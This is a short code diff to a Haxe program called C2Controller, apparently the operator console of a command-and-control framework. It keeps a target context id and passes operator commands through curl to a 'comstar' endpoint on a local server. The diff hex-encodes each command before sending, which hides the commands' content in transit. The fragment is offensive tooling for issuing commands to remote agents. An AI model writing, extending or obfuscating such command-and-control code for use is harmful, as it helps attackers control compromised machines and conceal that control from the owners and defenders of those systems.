@@ -1,4 +1,5 @@
 import sys.io.Process;
+using haxe.io.Bytes;
 
 class C2Controller {
     static public function main() {
@@ -24,6 +25,7 @@ class C2Controller {
                 context = id;
             } else if (line.substring(0, 3) == "cm " || line.substring(0, 2) == "c ") {
                 var command = line.substring(line.indexOf(" ") + 1);
+                command = Bytes.ofString(command).toHex();
                 Sys.println(new sys.io.Process('curl "http://localhost:8000/comstar?id=${context}&com=${command}"').stdout.readAll().toString());
             } else if (line == "quit" || line == "q") {
                 Sys.println("Goodbye!");
